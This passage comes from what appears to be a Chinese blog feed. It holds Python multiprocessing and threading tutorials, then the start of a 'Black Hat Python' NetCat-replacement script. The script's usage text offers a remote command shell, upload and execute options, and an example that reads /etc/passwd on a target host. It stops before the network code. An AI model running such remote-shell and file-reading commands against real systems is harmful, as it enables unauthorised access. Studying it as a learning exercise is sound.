string\">'man.jpg'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> image <span class=\"token keyword\">in</span> images<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'正在下载:'</span><span class=\"token punctuation\">,</span> image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getfile</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125;保存成功！'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'全部保存完毕！'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    q <span class=\"token operator\">=</span> Queue<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p1 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>download<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p2 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>getfile<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p2<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p2<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'00000000000'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"多线程\"><a class=\"anchor\" href=\"#多线程\">#</a> 多线程</h1>\n<p>threading 库</p>\n<h2 id=\"导入方法-2\"><a class=\"anchor\" href=\"#导入方法-2\">#</a> 导入方法</h2>\n<p>import threading</p>\n<h2 id=\"代码-2\"><a class=\"anchor\" href=\"#代码-2\">#</a> 代码</h2>\n<h3 id=\"threading01\"><a class=\"anchor\" href=\"#threading01\">#</a> threading01</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 线程</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  考虑？创建线程？ 如何使用线程？</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   t = threading02.Thread(target=download, name='aa', args=(1,))</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    t.start()</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  线程：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    新建  就绪  运行  阻塞  结束</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 进程： Process</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 线程:  Thread</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">download</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'girl.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'boy.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'man.jpg'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">for</span> image <span class=\"token keyword\">in</span> images<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'正在下载:'</span><span class=\"token punctuation\">,</span> image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'下载&#123;&#125;成功！'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">listenMusic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    musics <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'大碗宽面'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'土耳其冰淇淋'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'烤面筋'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'烤馒头片'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">for</span> music <span class=\"token keyword\">in</span> musics<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'正在听&#123;&#125;歌！'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>music<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># 线程对象</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    t <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>download<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'aa'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    t1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>listenMusic<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    t1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token comment\"># n = 1</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token comment\"># while True:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token comment\">#     print(n)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token comment\">#     sleep(1.5)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token comment\">#     n += 1</span></pre></td></tr></table></figure><h3 id=\"threading02\"><a class=\"anchor\" href=\"#threading02\">#</a> threading02</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>线程是可以共享全局变量的</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>GIL  全局解释器锁</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>ticket <span class=\"token operator\">=</span> <span class=\"token number\">1000</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">global</span> ticket</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        ticket <span class=\"token operator\">-=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># def run2():</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#     global ticket</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#     for i in range(100):</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#         ticket -= 1</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># 创建线程</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    th1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>run1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"th1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    th2 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>run1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"th2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    th3 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>run1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"th3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    th4 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>run1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"th4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\"># 启动</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    th1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    th2<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    th3<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    th4<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    th1<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    th2<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    th3<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    th4<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'money:'</span><span class=\"token punctuation\">,</span> ticket<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"threading03\"><a class=\"anchor\" href=\"#threading03\">#</a> threading03</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">global</span> n</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        n <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----》task1中的n值是：'</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">global</span> n</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        n <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----》task2中的n值是：'</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    th1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    th2 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    th1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    th2<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    th1<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    th2<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"最后打印n:\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "multiprocessing",
                "threading"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0(%E4%B8%80)%E2%80%94%E2%80%94%E5%8F%96%E4%BB%A3NetCat/",
            "url": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0(%E4%B8%80)%E2%80%94%E2%80%94%E5%8F%96%E4%BB%A3NetCat/",
            "title": "BHP第二章(一)——取代NetCat",
            "date_published": "2020-12-01T14:22:41.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>Python 学了一年了，想进一步提升自己的编程能力。就去看了 Justin Seitz 的《Python 黑帽子》，对 Python 又有了新的认识，准备深研读这本书。</p>\n</blockquote>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>本来想自己改进一下书上写的代码，网上冲浪时发现已经有人早就写了。附上<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTQ5MDcwL2FydGljbGUvZGV0YWlscy8xMDgxOTM1Mzc=\"> https://blog.csdn.net/qq_40549070/article/details/108193537</span></p>\n<h1 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> getopt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> chardet</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 定义一些全局变量</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>listen <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>command <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>execute <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>upload_destination <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>port <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">usage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"BHP Net Tool\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage: bhpnet.py -t target_host -p port\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-l --listen    -listen on [host]:[port] for incoming connections\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-e --execute=file_to_run    -execute the given file upon receiving a connection\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-c --command    -initialize a command shell\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-u --upload=destination    -upon receiving connection upload a file and write to [destination]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Examples:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bhpnet.py -t 192.168.0.1 -p 5555 -l -c\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\\"cat /etc/passwd\\\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">global</span> listen<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">,</span> execute<span class=\"token punctuation\">,</span> upload_destination<span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">,</span> port</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        usage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token comment\"># 读取命令行选项</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td 